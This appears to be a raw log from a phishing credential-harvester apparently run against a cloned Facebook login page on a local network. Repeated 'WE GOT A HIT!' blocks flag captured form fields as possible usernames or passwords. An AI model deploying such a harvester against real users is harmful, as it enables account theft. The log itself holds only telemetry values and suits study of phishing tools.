192.168.15.171 - - [21/Feb/2024 17:34:23] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=2&__rev=1011554900&__s=ybeaof%3A83l9ov%3A6hotdn&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=0                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=4                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=ybeaof:7dw0yc:y7dq5g                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:24] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=0                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=5                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=ybeaof:7dw0yc:y7dq5g                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:24] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=0                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=6                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=ybeaof:7dw0yc:y7dq5g                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:24] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------296432856634234166403555239450                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547684618                                                                
-----------------------------296432856634234166403555239450                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":[["falco:ods_web_batch",{"e":"{\"batch\":{\"7173\":{\"entities.ff_js_webweb_time_spent_bit_array.256281040558.0.C3\":{\"event.logged\":[1,null],\"event.info.upload_method.banzai.log_immediately\":[1,null],\"event.info.banzai.log_immediately.upload_processing\":[1,null],\"event.uploaded\":[1,null],\"event.captured\":[1,null]}}}}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":"ybeaof:83l9ov:6hotdn","t":1708547427021.9,"b":[1,0]},1708547667864,0,562]],"user":"0","webSessionId":"ybeaof:83l9ov:6hotdn","send_method":"beacon","compression":""}]                                    
-----------------------------296432856634234166403555239450--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:44] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=3&__rev=1011554900&__s=ybeaof%3A83l9ov%3A6hotdn&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
192.168.15.171 - - [21/Feb/2024 17:34:48] "GET /index.html HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------157772159420888583061352636954                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547688687                                                                
-----------------------------157772159420888583061352636954                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"nQnwVltbImZhbGNvOndlYl90aW1lX3NwZW50X2JpdF9hcnJheSIseyJlIjoie1wic2lkX3Jhd1wiOlwieWJlYW9mOjgzbDlvdjo2aG90ZG5cIixcInN0YXJ0XwFKSFwiOjE3MDg1NDc2NjUsXCJ0b3MJUzhcIjpbMTYwNTYzMTEsMF0NGxxjdW1cIjoyNw0PHGlkXCI6XCI2GVoBQAhsZW4BJQA0DSUIc2VxAWbwzH0iLCJyIjoxLCJkIjoiJF58QWNiNkNJdkNVM20tQ25BcmMyWU5QNUpjVnNrbFpaM2dhTDAyRmNMWlFIbjZfa091NmRjUTN4djVzd3pUQ0R6YnUtWXN5X2hxX2VuSUdWLUw2ODhwRHlwTkdRfGZkLkFjWjFSREIxQnM1LXM3dzlxclBJLTBaT0tRT1VTUTJMSDNyTzFJcTcwRnowNHB4cmU0LVVSN0kyS3pDeGh6U2xlTGtmcUZHODZiNXlpTk9ieEFwZEVlRUgiLCJzIjpSWwEMIiwidDVPKDQ0NzgzNC45LCJiIUoQLDBdfSwxajA4ODY3OCwwLDQyMF0sLtwBDGJsdWUu4QEkbmF2aWdhdGlvbj3iIGpzb25fZGF0YSV8PHtcXFwic291cmNlX3BhdGgBDwA6AQVIWFdlYkxvZ2luQ29udHJvbGxlcgEXACwBBQ0wEHRva2VuARAFMRw5NmU4OGFmMwERBSYMZGVzdBlUDG51bGwZFxk7FRgQY2F1c2UBPQVOFHVubG9hZAEPBTUAc02XBFxcCR8IeWJlRpsCBFxcCS08Y2xpY2tfcG9pbnRfaW5mbwEZADoF6RBjbGFzcwUPAQUUXzlsc2IgAQYAOQEPAH0JaikMFGVmX3BhZwmQFaMNHAh1cmkBMAVEZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sITwMLnBocAErCH1cIv7AAv7AAv7AAs7AAgA4YsACJDgxLDAsNjQyXV0=","user":"0","webSessionId":"ybeaof:83l9ov:6hotdn","send_method":"beacon","compression":"snappy_base64","snappy_ms":7}]                
-----------------------------157772159420888583061352636954--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:48] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=4&__rev=1011554900&__s=ybeaof%3A83l9ov%3A6hotdn&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------3130111623862410207715109158                                                                  
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547690089                                                                
-----------------------------3130111623862410207715109158                    
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"5QzIW1siZmFsY286cWUyX2pzX2V4cG9zdXJlIix7ImUiOiJ7XCJ1bml2ZXJzZVwiOlwiZmJ0ASdUcGVyZm9ybWFuY2VfdGVzdGluZ1wiLAUsDHRfaWQFKxkR9CABdHlwZVwiOjl9IiwiciI6MSwiZCI6IiRefEFjYjZDSXZDVTNtLUNuQXJjMllOUDVKY1Zza2xaWjNnYUwwMkZjTFpRSG42X2tPdTZkY1EzeHY1c3d6VENEemJ1LVlzeV9ocV9lbklHVi1MNjg4cER5cE5HUXxmZC5BY1oxUkRCMUJzNS1zN3c5cXJQSS0wWk9LUU9VU1EyTEgzck8xSXE3MEZ6MDRweHJlNC1VUjdJMkt6Q3hoelNsZUxrZnFGRzg2YjV5aU5PYnhBcGRFZUVIIiwicyI6InliZWFvZjo4M2w5b3Y6bG1vYzVxIiwidCI6MTcwODU0NzQxMzc1Mi40LCJiIjpbMSwwXX0sMTcwODU0NzY4OTA4MCwwLDM0MV0sWy2EdHdlYl9ibHVlX3RpbWVfc3BlbnRfbmF2aWdhdGlvbj2TIGpzb25fZGF0YSVpPHtcXFwic291cmNlX3BhdGgBDwA6AQVIWFdlYkxvZ2luQ29udHJvbGxlcgEXACwBBQ0wEHRva2VuARAFMRw5NmU4OGFmMwERBSYMZGVzdKZUAAUuelIAJGltcHJlc3Npb25BKARcXAl5QDFpSldwREk2SXBXdmJUcVR5ARoFghBjYXVzZQEOBaEMbG9hZAENBRsYc2lkX3JhdwEQBR0IeWJlQpEBAR0ALAEFDfAUZWZfcGFnCVEMbnVsbC4cAAh1cmkBKgVMZGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sIVAMLnBocAErBT4F9lJYAAUa2lYADbAYcmVzdG9yZQX1HDp0cnVlfVwi/kcD/kcD/kcDxkcDCDg4M2ZHAyA0LDAsNzc3XSyRy2FHgaFAX2RldmljZV9pbmZvX2xvZyKZ1FBjcHVfY29yZXNcIjoxLFwicmFtXCJNETAiZ3B1X3JlbmRlcmVyQaAYImxsdm1waYHEACwJHhB2ZW5kbwkcJE1lc2EvWC5vcmf+mQH+mQH+mQHOmQEIOTUxXpkBKDE1MywwLDM1M11d","user":"0","webSessionId":"ybeaof:83l9ov:lmoc5q","trigger":"falco:web_blue_time_spent_navigation","send_method":"ajax","compression":"snappy_base64","snappy_ms":4}]                                            
-----------------------------3130111623862410207715109158--                  
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:50] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=1&__rev=1011554900&__s=ybeaof%3A83l9ov%3Almoc5q&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------172774041341153949771523866190                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547694400                                                                
-----------------------------172774041341153949771523866190                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":"xAiAW1siZmFsY286b2RzX3dlYl9iYXRjaCIseyJlIjoie1wiBRAkXCI6e1wiMjk2NgkKTG1zLnRpbWVfc3BlbnQucWEud3d3CRodF5hiaXRzLmpzX2luaXRpYWxpemVkXCI6WzEsbnVsbF19fSxcIjcxNzMJODBlbnRpdGllcy5mZl9qBYoIcWUyAQpkZXhwb3N1cmUuMjU2MjgxMDQwNTU4LjAuQzMNOQB2AYMMbG9nZzJfAAgsXCIJGhRjYXB0dXJWHAAoaW5mby5iYW56YWkBQkQudXBsb2FkX3Byb2Nlc3NpbmcdsBVRCSUyUQAAfQEdQsEAJU4MbHVlXzkUKF9uYXZpZ2F0aW9u3tAABbQJhBhfbWV0aG9kHcIsX2ltbWVkaWF0ZWx5TrwABT0Z8S4vABFUwv0AAfwlhEpqAWYZASxwZXJmX2RldmljZV8BlgxfbG9n8hMBGdb+ygBWygD0GgF9fX0iLCJyIjoxLCJkIjoiJF58QWNiNkNJdkNVM20tQ25BcmMyWU5QNUpjVnNrbFpaM2dhTDAyRmNMWlFIbjZfa091NmRjUTN4djVzd3pUQ0R6YnUtWXN5X2hxX2VuSUdWLUw2ODhwRHlwTkdRfGZkLkFjWjFSREIxQnM1LXM3dzlxclBJLTBaT0tRT1VTUTJMSDNyTzFJcTcwRnowNHB4cmU0LVVSN0kyS3pDeGh6U2xlTGtmcUZHODZiNXlpTk9ieEFwZEVlRUgiLCJzIjoieWJlYW9mOjgzbDlvdjpsbW9jNXEiLCJ0IjoxNzA4NTQ3NDE4NzUyLjQsImIiOlsxLDBdfSwxNzA4NTQ3NjkzOTU0LDAsMTA0NV1d","user":"0","webSessionId":"ybeaof:83l9ov:lmoc5q","send_method":"beacon","compression":"snappy_base64","snappy_ms":1}]                                                                        
-----------------------------172774041341153949771523866190--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:54] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=2&__rev=1011554900&__s=ybeaof%3A83l9ov%3Almoc5q&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------23439252138286881941408092383                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547699087                                                                
-----------------------------23439252138286881941408092383                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"ybeaof:83l9ov:lmoc5q\",\"start_time\":1708547689,\"tos_array\":[11,0],\"tos_cum\":3,\"tos_id\":\"lmoc5q\",\"tos_len\":9,\"tos_seq\":0}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":"ybeaof:83l9ov:lmoc5q","t":1708547421882.4,"b":[1,0]},1708547697083,0,412]],"user":"0","webSessionId":"ybeaof:83l9ov:lmoc5q","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":""}]                                                          
-----------------------------23439252138286881941408092383--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:34:59] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=3&__rev=1011554900&__s=ybeaof%3A83l9ov%3Almoc5q&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: -----------------------------87873871623778599022648678182                                                                
Content-Disposition: form-data; name="ts"                                    
                                                                             
1708547708673                                                                
-----------------------------87873871623778599022648678182                  
Content-Disposition: form-data; name="q"                                    
                                                                             
[{"app_id":"256281040558","posts":[["falco:web_time_spent_bit_array",{"e":"{\"sid_raw\":\"ybeaof:7dw0yc:y7dq5g\",\"start_time\":1708547642,\"tos_array\":[383,1024],\"tos_cum\":17,\"tos_id\":\"y7dq5g\",\"tos_len\":64,\"tos_seq\":1}","r":1,"d":"$^|Acb6CIvCU3m-CnArc2YNP5JcVsklZZ3gaL02FcLZQHn6_kOu6dcQ3xv5swzTCDzbu-Ysy_hq_enIGV-L688pDypNGQ|fd.AcZ1RDB1Bs5-s7w9qrPI-0ZOKQOUSQ2LH3rO1Iq70Fz04pxre4-UR7I2KzCxhzSleLkfqFG86b5yiNObxApdEeEH","s":"ybeaof:7dw0yc:y7dq5g","t":1708547486334.4,"b":[1,0]},1708547706670,0,418]],"user":"0","webSessionId":"ybeaof:7dw0yc:y7dq5g","trigger":"falco:web_time_spent_bit_array","send_method":"ajax","compression":""}]                                                    
-----------------------------87873871623778599022648678182--                
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:35:08] "POST /ajax/bz?__a=1&__aaid=0&__ccg=EXCELLENT&__dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw&__hs=19774.BP%3ADEFAULT.2.0..0.0&__hsi=7338155262530080194&__req=7&__rev=1011554900&__s=ybeaof%3A7dw0yc%3Ay7dq5g&__spin_b=trunk&__spin_r=1011554900&__spin_t=1708547413&__user=0&dpr=1&jazoest=2907&lsd=AVoAh3MjaHI HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[Session]=20                                            
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=1                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=4                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=ybeaof:83l9ov:lmoc5q                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:35:09] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[Session]=20                                            
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=1                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=5                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=ybeaof:83l9ov:lmoc5q                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:35:09] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[Session]=20                                            
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=1                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=6                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                                
PARAM: __ccg=EXCELLENT                                                      
PARAM: __rev=1011554900                                                      
PARAM: __s=ybeaof:83l9ov:lmoc5q                                              
PARAM: __hsi=7338155262530080194                                            
PARAM: __dyn=7xe6E5aQ1PyUbFp41twpUnwgU29zEdEc8uwdK0lW4o3Bw5VCwjE3awbG782Cw8G1Qw5Mx61vw5zwwwi81nE1u83mwaS0zK1swc-0lK3qaw4kwbS1Lw7Jw7zw                    
PARAM: __csr=                                                                
PARAM: lsd=AVoAh3MjaHI                                                      
PARAM: jazoest=2907                                                          
POSSIBLE PASSWORD FIELD FOUND: __spin_r=1011554900                          
POSSIBLE PASSWORD FIELD FOUND: __spin_b=trunk                                
POSSIBLE PASSWORD FIELD FOUND: __spin_t=1708547413                          
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.                
                                                                             
                                                                             
192.168.15.171 - - [21/Feb/2024 17:35:09] "POST /ajax/webstorage/process_keys/?state=1 HTTP/1.1" 302 -
[*] WE GOT A HIT! Printing the output:
PARAM: local_storage[hb_timestamp]=13                                        
PARAM: local_storage[signal_flush_timestamp]=13                              
PARAM: local_storage[Session]=20                                            
PARAM: session_storage[TabId]=6                                              
PARAM: session_storage[sp_pi]=216                                            
PARAM: logtime=0                                                            
PARAM: __aaid=0                                                              
POSSIBLE USERNAME FIELD FOUND: __user=0                                      
PARAM: __a=1                                                                
PARAM: __req=8                                                              
PARAM: __hs=19774.BP:DEFAULT.2.0..0.0                                        
PARAM: dpr=1                                                
...
